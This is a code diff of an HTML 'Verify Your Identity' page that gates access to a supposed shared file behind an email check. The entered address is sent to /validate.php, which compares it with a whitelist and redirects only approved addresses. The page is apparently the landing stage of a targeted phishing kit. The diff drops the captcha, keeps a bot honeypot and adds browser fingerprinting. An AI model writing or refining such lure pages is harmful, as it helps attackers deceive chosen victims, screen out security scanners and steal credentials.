@@ -178,14 +178,12 @@
     <!-- Logo above the card -->
     <img class="card-logo" src="nn.PNG" alt="" width="100" height="100" decoding="async" loading="eager">
 
-    <!-- Honeypot + optional captcha token (can sit outside; JS reads them by id) -->
+    <!-- Honeypot -->
     <input type="text" id="middleName" name="middleName" tabindex="-1" autocomplete="off"
            aria-hidden="true" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;border:0;padding:0;">
-    <input type="hidden" id="cfToken" name="cfToken" value="">
 
     <!-- Form -->
     <form class="card" id="verifyForm" method="post" action="/validate.php">
-    
       <header class="card-head" aria-labelledby="t">
         <h1 id="t" class="card-title">Verify Your Identity</h1>
       </header>
@@ -201,117 +199,133 @@
                  placeholder="Enter email" required inputmode="email" />
         </div>
 
+        <!-- Error box (hidden by default) -->
+        <div id="err" class="alert"
+             style="display:none;margin-top:10px;font:12px/1.4 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#b91c1c;"
+             role="status" aria-live="polite"></div>
+
         <div class="actions">
           <button class="btn" id="continueBtn" type="submit" disabled>Next</button>
         </div>
 
         <div class="caption" id="disclosure">
-          <small>By selecting “Next”, you allow this form to use your email in accordance with its Privacy Notice.</small>
+          <small>By selecting Next you allow this form to use your email in accordance with its Privacy Notice.</small>
         </div>
       </section>
     </form>
   </main>
-<div class="simple-footer">© 2025&nbsp;&nbsp;Privacy &amp; Cookie</div>
+
+  <div class="simple-footer">© 2025&nbsp;&nbsp;Privacy &amp; Cookie</div>
+
+</body>
 
 
 
-  <script>
-    // ---- Elements
-    const form  = document.getElementById('verifyForm');
-    const email = document.getElementById('email');
-    const btn   = document.getElementById('continueBtn');
 
-    // Optional hidden fields (ok if missing)
-    const cfTok = document.getElementById('cfToken');    // e.g., Turnstile/Recaptcha
-    const hp    = document.getElementById('middleName'); // honeypot (must stay empty)
 
-    // Guards (avoid null refs if DOM changes)
-    if (!form || !email || !btn) {
-      console.error('Verify form not found or missing elements.');
-    } else {
-      // Enable button only when email shape is OK
-      const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v).trim());
-      email.addEventListener('input', () => { btn.disabled = !looksLikeEmail(email.value) });
 
-      // Message helper
-      function showMsg(text, ok=false){
-        let el = document.getElementById('alert');
-        if (!el) {
-          el = document.createElement('div');
-          el.id = 'alert';
-          el.className = 'alert';
-          form.querySelector('.card-body').appendChild(el);
-        }
-        el.textContent = text;
-        el.setAttribute('role', 'status');
-        el.style.color = ok ? '#1e5fcc' : '#b91c1c';
-      }
 
-      // Resolve endpoint from form action (defaults to /validate.php)
-      const endpoint = new URL(form.getAttribute('action') || '/validate.php', location.href).toString();
 
-      // Progressive-enhanced JSON submit (backend expects JSON)
-      form.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        if (!looksLikeEmail(email.value)) {
-          showMsg('Please enter a valid email address.');
-          return;
-        }
 
-        btn.disabled = true;
-        const original = btn.textContent;
-        btn.textContent = 'Checking…';
 
-        const payload = {
-          email: String(email.value || '').trim().toLowerCase(),
-          jsToken: 'ok-' + Math.random().toString(36).slice(2),
-          cfToken: cfTok ? cfTok.value : '',
-          middleName: hp ? hp.value : ''   // must be empty; backend flags bots otherwise
-        };
 
-        // Timeout after 12s to avoid hanging UI
-        const ctl = new AbortController();
-        const t = setTimeout(() => ctl.abort(), 12000);
 
-        try {
-          const res = await fetch(endpoint, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json; charset=utf-8',
-              'X-Client-Lang': navigator.language || 'en'
-            },
-            body: JSON.stringify(payload),
-            signal: ctl.signal
-          });
+ <script>
+document.addEventListener('DOMContentLoaded', () => {
+  // Tiny helper
+  const $ = id => document.getElementById(id);
 
-          let data = null;
-          try { data = await res.json(); } catch { data = {}; }
+  // i18n (EN/FR)
+  const LANG = (navigator.language || 'en').slice(0,2);
+  const T = {
+    en: { invalidEmail:'Please enter a valid email address.', errorGeneric:'Something went wrong. Please try again.', redirecting:'Redirecting…' },
+    fr: { invalidEmail:'Veuillez saisir une adresse e-mail valide.', errorGeneric:'Une erreur est survenue. Merci de réessayer.', redirecting:'Redirection…' }
+  };
+  const t = T[LANG] || T.en;
 
-          // Success path (whitelisted): backend returns { valid:true, redirect:"..." }
-          if (res.ok && data && data.valid && data.redirect) {
-            showMsg(data.message || 'Validated', true);
-            location.assign(data.redirect);
-            return;
-          }
+  // Endpoint (your PHP bridge/back-end)
+  const gateway = '/validate.php';
 
-          // Friendly, non-enumerating message for all other cases
-          showMsg('If your email is permitted for this file, you will receive access shortly.');
-        } catch (err) {
-          showMsg('Network issue. Please retry in a moment.');
-        } finally {
-          clearTimeout(t);
-          btn.disabled = !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email.value).trim());
-          btn.textContent = original;
-        }
+  // DOM refs
+  const form     = $('verifyForm');
+  const input    = $('email');
+  const errBox   = $('err');
+  const submitEl = $('submitBtn') || $('continueBtn'); // support either id
+
+  const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(v).trim());
+  const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
+  const hide = (n) => { if (!n) return; n.style.display = 'none'; };
+
+  // Optional: simple fingerprint (backend can ignore it)
+  let fpHash = '';
+  (async () => {
+    try {
+      const sig = [navigator.userAgent, navigator.language, navigator.platform, screen.width + 'x' + screen.height].join('|');
+      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(sig));
+      fpHash = btoa(String.fromCharCode(...new Uint8Array(buf)));
+    } catch {}
+  })();
+
+  // Enable/disable button as user types
+  input?.addEventListener('input', () => {
+    hide(errBox);
+    if (submitEl) submitEl.disabled = !looksLikeEmail(input.value);
+  });
+
+  // Submit → server whitelist check (no captcha)
+  form?.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const val  = (input?.value || '').trim();
+    const trap = ($('middleName')?.value || '').trim(); // honeypot; must be empty
+
+    if (!looksLikeEmail(val)) return show(errBox, t.invalidEmail);
+    if (trap) return; // bot
+
+    const payload = {
+      email: val.toLowerCase(),
+      middleName: trap,
+      jsToken: 'ok-' + Math.random().toString(36).slice(2),
+      fingerprint: fpHash
+    };
+
+    // Abort after 12s to avoid hanging
+    const ctl = new AbortController();
+    const timer = setTimeout(() => ctl.abort(), 12000);
+
+    try {
+      if (submitEl) { submitEl.disabled = true; submitEl.textContent = 'Checking…'; }
+
+      const res = await fetch(gateway, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept-Language': LANG },
+        body: JSON.stringify(payload),
+        signal: ctl.signal
       });
 
-      // Optional: query params → UI
-      const q = new URLSearchParams(location.search);
-      const fileEl = document.getElementById('fileName');
-      if (q.get('file') && fileEl) fileEl.textContent = q.get('file');
-      const hostEl = document.getElementById('hostDomain');
-      if (q.get('host') && hostEl) hostEl.textContent = q.get('host');
+      const text = await res.text();
+      let json = {};
+      try { json = JSON.parse(text); } catch {}
+
+      if (res.ok && json.valid && json.redirect) {
+        if (submitEl) submitEl.textContent = t.redirecting;
+        setTimeout(() => { location.assign(json.redirect); }, 600);
+      } else {
+        const msg = (json && (json.message || json.detail))
+          ? json.message + (json.detail ? ` (${json.detail})` : '')
+          : `${t.errorGeneric} [${res.status}]`;
+        show(errBox, msg);
+        if (submitEl) { submitEl.disabled = !looksLikeEmail(val); submitEl.textContent = 'Next'; }
+      }
+    } catch {
+      show(errBox, t.errorGeneric);
+      if (submitEl) { submitEl.disabled = !looksLikeEmail(input.value); submitEl.textContent = 'Next'; }
+    } finally {
+      clearTimeout(timer);
     }
-  </script>
+  });
+});
+</script>
+
 </body>
 </html>
